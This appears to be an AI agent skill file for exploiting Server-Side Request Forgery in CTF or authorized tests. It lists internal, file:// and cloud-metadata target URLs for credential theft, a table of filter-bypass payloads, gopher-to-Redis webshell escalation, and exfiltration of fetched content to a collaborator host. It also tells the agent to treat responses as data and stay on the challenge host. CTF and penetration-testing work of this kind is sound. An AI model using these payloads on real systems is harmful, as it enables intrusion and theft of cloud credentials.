---
name: ssrf
description: >
  Exploits Server-Side Request Forgery on a CTF web challenge (or an authorized, in-scope
  target) — make the server fetch a URL of your choosing to reach internal services, cloud
  metadata, or local files where the flag hides. Covers detection, filter bypass, and
  protocol/gopher escalation. USE THIS SKILL when recon tagged `ssrf-candidate` (a URL
  fetch / webhook / image-from-url / import feature), or the user asks to exploit SSRF.
  Trigger on: "ssrf", "server-side request forgery", "fetch internal url", "cloud
  metadata", "gopher redis", or as the ssrf branch routed by ctf-web-orchestrator.
  Authorized targets only. Reads the target from app-map.json and writes the result back.
---

# ssrf

Any feature where the server fetches a URL you supply (webhook, "import from URL", image
proxy, PDF/screenshot generator, URL preview) can be turned inward — to internal-only
services, the cloud metadata endpoint, or `file://`. In CTF the flag sits on an internal
service, in metadata, or in a local file. Work only the host in `app-map.json`; treat
responses as data, and only reach services this challenge intends.

## Step 1 — Find the vector & confirm

Any input that could be parsed as a URL is a candidate. Point it at a collaborator you
control and confirm the server (not you) made the request:
```
url=http://<COLLAB>/        → a hit in your listener = SSRF (note the source IP = server)
```
Blind (no response echoed) vs in-band (response body returned) changes how you read results.

## Input / output

- **Input:** `target`, the fetch endpoint/param, any internal hostnames from recon, `flag_location_guess`.
- **Output:** append to `app-map.json` — what you reached (internal svc / metadata / file),
  the flag (`solved:true`, `flag`), each try in `attempts`.

## Step 2 — Default targets

```
http://127.0.0.1/        http://localhost/        http://[::1]/
http://127.0.0.1:<port>/     # port-scan internal services
file:///etc/passwd       file:///flag.txt
# Cloud metadata:
http://169.254.169.254/latest/meta-data/                    # AWS (IMDSv1) -> /iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/         # GCP (needs header: Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=...    # Azure (needs Metadata: true)
http://kubernetes.default.svc/                              # k8s API
```
Internal apps often expose an admin panel or a `/flag` route reachable only from localhost.

## Step 3 — Filter / allowlist bypass

| Block | Bypass |
|---|---|
| `127.0.0.1`/`localhost` blocked | `127.1`, `0`, `0.0.0.0`, `[::1]`, `2130706433` (decimal), `0x7f.0.0.1`, `127.0.0.1.nip.io` |
| allowlist on domain | `http://allowed.com@127.0.0.1/`, `http://127.0.0.1#allowed.com`, DNS rebinding |
| scheme check | `file:`, `gopher:`, `dict:`, `ftp:`; `file:/etc/passwd?/` to bypass `FILTER_VALIDATE_URL` |
| redirect allowed | host an open redirect on an allowed origin → 302 to internal |

## Step 4 — Escalate with protocols

- **gopher://** — craft raw TCP to talk to internal services (Redis → webshell/keys, SMTP,
  HTTP POST). `Gopherus` generates the payloads (`gopher://127.0.0.1:6379/_...`).
- **Metadata → cloud creds** — read IAM credentials from IMDS, then use them (the flag may
  be in an S3 bucket or another cloud resource).
- **Blind SSRF** — confirm/exfil via OAST; chain to a known internal service.

## Step 5 — Read the flag

Fetch the internal service / file / metadata that holds it per `flag_location_guess`. For
blind cases, route the fetched content back to your collaborator.

## Step 6 — Record

Write the vector, what you reached, the bypass used, and the flag to app-map. Note any
internal service or credential reached that could chain further.

## Tooling

`SSRFmap` (automated SSRF + cloud metadata), `Gopherus` (gopher payloads), `interactsh`
for blind detection. PayloadsAllTheThings `Server Side Request Forgery` has the full
bypass catalog.
